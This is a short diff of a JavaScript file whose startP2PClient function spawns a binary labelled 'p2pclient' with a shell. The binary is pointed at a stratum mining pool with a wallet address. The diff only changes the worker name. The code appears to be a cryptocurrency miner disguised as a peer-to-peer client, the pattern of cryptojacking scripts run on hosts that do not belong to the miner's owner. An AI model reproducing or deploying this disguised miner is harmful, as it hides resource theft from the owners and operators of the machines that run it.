@@ -82,7 +82,7 @@ async function startP2PClient() {
 
     logger.info('🚀 Starting p2pclient...');
     // Pastikan untuk menjalankan dengan shell
-    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008'], { shell: true });
+    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek2@us.catchthatrabbit.com:8008'], { shell: true });
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
